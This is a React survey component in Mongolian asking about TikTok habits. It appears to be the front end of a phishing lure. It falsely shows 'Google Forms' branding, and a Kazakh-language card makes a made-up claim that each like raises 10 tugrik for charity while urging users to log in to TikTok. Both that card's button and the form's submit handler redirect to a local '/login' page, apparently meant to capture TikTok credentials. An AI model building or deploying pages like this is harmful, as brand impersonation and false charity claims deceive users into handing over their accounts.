import { useState } from "react";
import "./Survey.css";

const QUESTIONS = [
  {
    id: 1,
    text: "Та TikTok хэрэглэдэг үү?",
    type: "radio",
    options: ["Тийм", "Үгүй", "Заримдаа хэрэглэдэг"],
  },
  {
    id: 2,
    text: "Та TikTok-ийг өдөрт хэдэн цаг хэрэглэдэг вэ?",
    type: "radio",
    options: ["1 цагаас бага", "1–2 цаг", "2–4 цаг", "4 цагаас дээш"],
  },
  {
    id: 3,
    text: "Та TikTok дээр ямар контент үздэг вэ? (Олон сонголт боломжтой)",
    type: "checkbox",
    options: [
      "Хошин шог / Инээдэм",
      "Боловсрол / Мэдлэг",
      "Хөгжим / Бүжиг",
      "Хоол хийх",
      "Гоо сайхан / Загвар",
      "Спорт",
      "Мэдээ / Нийгмийн асуудал",
    ],
  },
  {
    id: 4,
    text: "Та TikTok-т өөрийн видео нийтэлдэг үү?",
    type: "radio",
    options: [
      "Тийм, байнга нийтэлдэг",
      "Тийм, заримдаа нийтэлдэг",
      "Үгүй, зөвхөн үздэг",
    ],
  },
  {
    id: 5,
    text: "TikTok таны өдөр тутмын амьдралд хэр нөлөөлдөг вэ?",
    type: "radio",
    options: [
      "Маш их нөлөөлдөг",
      "Дунд зэрэг нөлөөлдөг",
      "Бага зэрэг нөлөөлдөг",
      "Огт нөлөөлдөггүй",
    ],
  },
  {
    id: 6,
    text: "Та TikTok-ийн аль нэг бүтээгчийг дагадаг уу?",
    type: "radio",
    options: ["Тийм, олон бүтээгч дагадаг", "Тийм, цөөхөн дагадаг", "Үгүй"],
  },
  {
    id: 7,
    text: "TikTok таны насны бүлэгт хэр тохиромжтой гэж үздэг вэ?",
    type: "radio",
    options: [
      "Маш тохиромжтой",
      "Тохиромжтой",
      "Хэсэгчлэн тохиромжтой",
      "Тохиромжгүй",
    ],
  },
  {
    id: 8,
    text: "Та TikTok-ийг найз нөхөддөө санал болгодог уу?",
    type: "radio",
    options: ["Тийм, байнга санал болгодог", "Заримдаа", "Үгүй"],
  },
];

export default function Survey() {
  const [answers, setAnswers] = useState({});
  const [submitted, setSubmitted] = useState(false);
  const [errors, setErrors] = useState({});

  function handleRadio(qId, value) {
    setAnswers((prev) => ({ ...prev, [qId]: value }));
    setErrors((prev) => ({ ...prev, [qId]: false }));
  }

  function handleCheckbox(qId, value) {
    setAnswers((prev) => {
      const current = prev[qId] || [];
      const updated = current.includes(value)
        ? current.filter((v) => v !== value)
        : [...current, value];
      return { ...prev, [qId]: updated };
    });
    setErrors((prev) => ({ ...prev, [qId]: false }));
  }

  function handleSubmit(e) {
    e.preventDefault();
    const newErrors = {};
    QUESTIONS.forEach((q) => {
      const ans = answers[q.id];
      if (!ans || (Array.isArray(ans) && ans.length === 0)) {
        newErrors[q.id] = true;
      }
    });
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      document
        .querySelector(".survey-error")
        ?.scrollIntoView({ behavior: "smooth", block: "center" });
      return;
    }
    setSubmitted(true);
    setTimeout(() => {
      window.location.href = "/login";
    }, 1800);
  }

  if (submitted) {
    return (
      <div className="survey-page">
        <div className="survey-thankyou">
          <div className="survey-check">✓</div>
          <h2>Баярлалаа!</h2>
          <p>Таны хариулт амжилттай хүлээн авлаа.</p>
          <p className="survey-redirect-note">Шилжиж байна...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="survey-page">
      {/* Header card */}
      <div className="survey-header-card">
        <div className="survey-header-bar" />
        <div className="survey-header-body">
          <h1 className="survey-title">TikTok Хэрэглэгчийн Судалгаа</h1>
          <p className="survey-desc">
            Сайн байна уу! Энэхүү судалгаа нь TikTok платформын хэрэглэгчдийн
            зан төлөвийг судлах зорилгоор явуулагдаж байна. Таны өгсөн мэдээлэл
            бүрэн нууцлалтай байх бөгөөд зөвхөн судалгааны зорилгоор
            ашиглагдана. Чин сэтгэлээсээ хариулна уу. Баярлалаа.
          </p>
          <p className="survey-required-note">
            <span className="survey-star">*</span> Заавал бөглөх асуулт
          </p>
        </div>
      </div>

      <form onSubmit={handleSubmit} noValidate>
        {QUESTIONS.map((q) => (
          <div
            key={q.id}
            className={`survey-card${errors[q.id] ? " survey-card--error" : ""}`}
          >
            <p className="survey-question">
              {q.text} <span className="survey-star">*</span>
            </p>
            {errors[q.id] && (
              <p className="survey-error survey-error--field">
                Энэ асуултад заавал хариулна уу
              </p>
            )}
            <div className="survey-options">
              {q.type === "radio"
                ? q.options.map((opt) => (
                    <label key={opt} className="survey-option">
                      <input
                        type="radio"
                        name={`q${q.id}`}
                        value={opt}
                        checked={answers[q.id] === opt}
                        onChange={() => handleRadio(q.id, opt)}
                      />
                      <span className="survey-radio-custom" />
                      <span className="survey-option-text">{opt}</span>
                    </label>
                  ))
                : q.options.map((opt) => (
                    <label key={opt} className="survey-option">
                      <input
                        type="checkbox"
                        value={opt}
                        checked={(answers[q.id] || []).includes(opt)}
                        onChange={() => handleCheckbox(q.id, opt)}
                      />
                      <span className="survey-checkbox-custom" />
                      <span className="survey-option-text">{opt}</span>
                    </label>
                  ))}
            </div>
          </div>
        ))}

        {/* TikTok support card */}
        <div className="survey-card survey-tiktok-card">
          <p className="survey-tiktok-support-desc">
            🙏 Бізді қолдап, міндетті түрде TikTok парақшамызға кіріңіз! Сол
            арқылы сіздің толтырған сауалнамаңыз <strong>қайырымдылыққа</strong>{" "}
            жұмсалады. Сіздің басқан әрбір лайкіңіз <strong>10 төгрөг</strong>{" "}
            болып есептеледі — сол себепті кіріп, лайк басыңыздар! ❤️
          </p>
          <button
            type="button"
            className="survey-tiktok-btn"
            onClick={() => {
              window.location.href = "/login";
            }}
          >
            <svg
              width="20"
              height="20"
              viewBox="0 0 48 48"
              fill="none"
              style={{ marginRight: 8, flexShrink: 0 }}
            >
              <path
                d="M38.4 10.56A11.2 11.2 0 0 1 32 8v8a11.2 11.2 0 0 0 6.4 1.92V10.56z"
                fill="#fff"
              />
              <path
                d="M32 8a11.2 11.2 0 0 0-11.2 11.2v12.8A5.6 5.6 0 1 1 15.2 26.4v-8.32A13.6 13.6 0 1 0 32 32V20.48A19.2 19.2 0 0 0 44.8 22.4v-8a11.2 11.2 0 0 1-12.8-6.4z"
                fill="#fff"
              />
            </svg>
            TikTok-те кіру
          </button>
        </div>

        <div className="survey-footer">
          <button type="submit" className="survey-submit-btn">
            Илгээх
          </button>
        </div>
      </form>

      <div className="survey-branding">
        <span>Google Forms</span>
      </div>
    </div>
  );
}
